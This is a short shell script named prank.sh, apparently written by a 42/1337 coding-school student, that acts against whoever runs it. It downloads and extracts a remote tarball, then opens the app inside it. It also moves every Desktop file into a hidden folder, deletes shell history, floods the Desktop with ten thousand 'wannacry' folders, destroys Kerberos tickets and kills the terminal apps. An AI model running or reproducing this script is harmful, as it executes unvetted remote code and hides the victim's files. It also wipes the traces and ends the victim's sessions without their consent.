# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    prank.sh                                           :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: alfertah <alfertah@student.1337.ma>        +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2022/08/09 15:49:36 by alfertah          #+#    #+#              #
#    Updated: 2022/08/09 15:49:41 by alfertah         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

mkdir -p /tmp/alfertah/

curl -s -L https://github.com/YelazZ/p1/raw/master/prank.tar.gz -o /tmp/alfertah/prank.tar.gz > /dev/null

tar xvf /tmp/alfertah/prank.tar.gz -C /tmp/alferta > /dev/null

mkdir ~/.alfertah/

mv ~/Desktop/* ~/.alfertah/

cd ~/Desktop

rm -rf ~/.*history*

mkdir wannacry{0..10000}

nohup open /tmp/alfertah/app/Laz.app > /dev/null

kdestroy
clear
rm -f ~/.*history*

killall iTerm
killall Terminal
killall iTerm2
